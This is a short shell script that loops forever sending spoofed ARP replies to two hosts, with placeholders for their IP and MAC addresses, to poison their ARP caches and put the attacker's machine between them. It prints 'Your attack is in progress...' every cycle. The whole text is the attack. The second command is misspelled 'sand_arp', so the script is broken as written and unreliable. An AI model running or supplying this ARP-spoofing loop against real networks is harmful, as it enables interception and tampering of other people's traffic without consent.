while true
do
  send_arp [target-B-IP] [your-mac] [target_A-IP] [target_A-MAC]
  sand_arp [target_A-IP] [your-mac] [target-B-IP] [target_B-MAC]
  echo "Your attack is in progress..."
  sleep 2
done
